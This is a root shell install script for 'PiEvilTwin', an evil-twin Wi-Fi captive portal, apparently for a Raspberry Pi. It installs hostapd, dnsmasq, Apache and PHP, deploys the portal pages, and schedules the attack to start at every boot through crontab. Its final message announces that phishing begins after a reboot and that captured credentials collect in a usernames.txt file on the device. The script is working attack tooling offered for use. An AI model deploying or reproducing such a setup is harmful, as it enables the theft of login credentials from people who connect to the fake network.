#!/bin/sh -e

if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root." 1>&2
   exit 1
fi

echo "Installing dependencies..."
apt-get install -y macchanger hostapd dnsmasq apache2 php

echo "Configuring components..."
echo "Setting up hostapd..."
cp -f hostapd.conf /etc/hostapd/
echo "Setting up dnsmasq..."
cp -f dnsmasq.conf /etc/
echo "Setting up HTML Files..."
cp -Rf html /var/www/
chown -R www-data:www-data /var/www/html
chown root:www-data /var/www/html/.htaccess
echo "Copying startup script..."
cp -f PiEvilTwinStart.sh /root/
crontab -l | { cat; echo "@reboot     sudo sleep 10 && sudo sh /root/PiEvilTwinStart.sh && sudo service dnsmasq restart &"; } | crontab -
echo "Setting up permissions..."
chmod +x /root/PiEvilTwinStart.sh
echo "Setting up Apache Config..."
cp -f override.conf /etc/apache2/conf-available/
cd /etc/apache2/conf-enabled
ln -s ../conf-available/override.conf override.conf
cd /etc/apache2/mods-enabled
ln -s ../mods-available/rewrite.load rewrite.load
echo "..."
echo "..."
echo "PiEvilTwin captive portal installed. Reboot and wait 30 seconds to start phishing. Credentials will be available here: http://10.1.1.1/usernames.txt"
exit 0
